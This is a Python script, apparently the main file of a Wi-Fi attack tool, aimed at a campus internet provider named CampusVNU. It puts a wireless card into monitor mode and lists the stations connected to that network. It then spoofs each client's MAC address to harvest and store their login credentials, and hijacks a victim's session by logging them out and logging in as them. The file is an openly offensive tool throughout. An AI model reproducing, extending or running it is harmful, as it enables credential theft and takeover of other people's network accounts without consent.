#!/usr/bin/env python

import os
import time

from pwn import log, success

from model.isp.campusvnu import CampusVNU
from tools.airmon import Airmon
from tools.airodump import Airodump


def checkroot():
    if os.geteuid():
        log.error("Run script as root!")


# TODO: add menu to select interfaces
def select_interface():
    global interface
    interface = "wlp5s0"


# TODO: add menu selector
def select_network():
    global network
    network = CampusVNU


def get_clients():
    moninterf = Airmon.start(interface)
    with Airodump(moninterf, essid_regex=network.name) as airodump:
        try:
            while True:
                print("BSSID\t\t\t\tPrivacy\tPWR\tBeacons\tESSID")

                targets = airodump.get_targets()
                for t in targets:
                    print(
                        f"{t.bssid}\t{t.privacy}\t\t{t.power}\t{t.beacons}\t\t{t.essid}"
                    )

                print("\n\nBSSID\t\t\t\tSTATION\t\t\tPWR\tPackets\tProbed ESSIDs")

                all_clients = airodump.get_clients()
                real_clients = []

                for c in all_clients:
                    for t in targets:
                        if c.bssid == t.bssid:
                            c.essid = t.essid
                            real_clients.append(c)

                for c in real_clients:
                    print(
                        f"{c.bssid}\t{c.station}\t{c.power}\t{c.packets}\t\t{c.probed_essids}"
                    )

                time.sleep(1)
                os.system("clear")
        except KeyboardInterrupt:
            global clients
            clients = real_clients
            Airmon.stop(moninterf)


def get_creddentials():
    global sessions
    sessions = []

    for c in clients:
        session = network(c)
        session.spoof(interface)

        if session.get_creddentials():
            session.print_info()
            session.store()
            sessions.append(session)
        else:
            session.print_info()

        print()


# TODO: print list of accounts with etr and bandwidth
def hijack():
    for s in sessions:
        log.info("Stealing session...")
        s.print_info()

        log.info("Logging out...")
        s.logout()

        s.reset_mac()

        log.info("Logging in...")
        s.login()

        success("Session stolen successfully!")
        break


# TODO: add more isp
# TODO: add connect offline from saved sessions
# TODO: remove expired sessions
if __name__ == "__main__":
    checkroot()
    select_interface()
    select_network()
    get_clients()
    get_creddentials()
    hijack()
